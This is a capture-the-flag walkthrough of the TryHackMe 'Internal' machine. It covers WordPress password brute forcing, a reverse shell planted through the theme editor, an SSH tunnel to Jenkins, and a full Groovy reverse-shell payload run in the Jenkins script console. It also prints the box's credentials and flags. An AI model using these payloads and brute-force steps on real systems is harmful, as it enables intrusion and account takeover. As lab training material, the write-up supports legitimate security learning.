# Internal

---

IP = `10.10.71.133`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
/blog
/phpmyadmin
/wordpress
```

`dirsearch -u internal.thm -e -x 400,500 -r -t 100`

/blog

```
/index.php            (Status: 301) [Size: 0] [--> http://10.10.71.133/blog/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.71.133/blog/]
/license.txt          (Status: 200) [Size: 19915]
/readme.html          (Status: 200) [Size: 7278]
/wp-admin             (Status: 301) [Size: 320] [--> http://10.10.71.133/blog/wp-admin/]
/wp-config.php        (Status: 200) [Size: 0]
/wp-blog-header.php   (Status: 200) [Size: 0]
/wp-content           (Status: 301) [Size: 322] [--> http://10.10.71.133/blog/wp-content/]
/wp-cron.php          (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 323] [--> http://10.10.71.133/blog/wp-includes/]
/wp-links-opml.php    (Status: 200) [Size: 223]
/wp-load.php          (Status: 200) [Size: 0]
/wp-login.php         (Status: 200) [Size: 4530]
/wp-mail.php          (Status: 403) [Size: 2711]
/wp-settings.php      (Status: 500) [Size: 0]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://internal.thm/blog/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
```

```
┌──(root㉿core)-[/work/ctf/thm/relevant]
└─# wpscan --url http://internal.thm/blog -e vp,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://internal.thm/blog/ [10.10.212.133]
[+] Started: Mon Sep 30 01:25:09 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.7
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:04 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:04

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Sep 30 01:25:40 2024
[+] Requests Done: 70
[+] Cached Requests: 7
[+] Data Sent: 16.729 KB
[+] Data Received: 22.001 MB
[+] Memory used: 281.746 MB
[+] Elapsed time: 00:00:31

┌──(root㉿core)-[/work/ctf/thm/relevant]
└─#
```

Found user `admin`

Let's bruteforce the password for admin

```
┌──(root㉿core)-[/work/ctf/thm/relevant]
└─# wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
_______________________________________________________________
--SNIP--
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
--SNIP--

┌──(root㉿core)-[/work/ctf/thm/relevant]
└─#
```

Password found

`admin : my2boys`

Logged in successfully


Found a private post with no title
http://internal.thm/blog/wp-admin/post.php?post=5&action=edit

http://internal.thm/blog/index.php/2020/08/03/5/

`Don't forget to reset Will's credentials. william:arnold147`


Change the theme
app0earance/themes/404.php
http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen

load the page 
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

`nc -lnvp 4545`

```
┌──(root㉿core)-[/work/ctf/thm/relevant]
└─# nc -lnvp 4545
listening on [any] 4545 ...
connect to [10.4.96.175] from (UNKNOWN) [10.10.212.133] 49728
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:57:29 up 35 min,  0 users,  load average: 0.06, 0.01, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

```
www-data@internal:/opt$ ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
www-data@internal:/opt$
```

`aubreanna:bubb13guM!@#123`

```
www-data@internal:/opt$ cat /etc/passwd
--SNIP--
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
--SNIP--
www-data@internal:/opt$
```

```
www-data@internal:/opt$ su aubreanna
Password:
aubreanna@internal:/opt$ whoami
aubreanna
```

```
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
aubreanna@internal:~$
```

> user.txt

`THM{int3rna1_fl4g_1}`

```
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

```
aubreanna@internal:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
--SNIP--
```

lets create ssh tunnel

`ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.212.133`

Do login

now the jenkins will be accessible from localhost

`http://127.0.0.1:8080/`

username : admin
bruteforce the password with burp intruder

`admin : spongebob`

login to the jenkin's dashboard

manage jenkins/script console/

```
String host="10.4.96.175";
int port=4242;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

`nc -lnvp 4545`

```
┌──(root㉿core)-[/work/ctf/thm/relevant]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.4.96.175] from (UNKNOWN) [10.10.212.133] 44844
whoami
jenkins
```

```
jenkins@jenkins:/$ cd /opt
jenkins@jenkins:/opt$ ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
jenkins@jenkins:/opt$
```

root:tr0ub13guM!@#123

`ssh root@10.10.212.133`

```
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
```

> root.txt

`THM{d0ck3r_d3str0y3r}`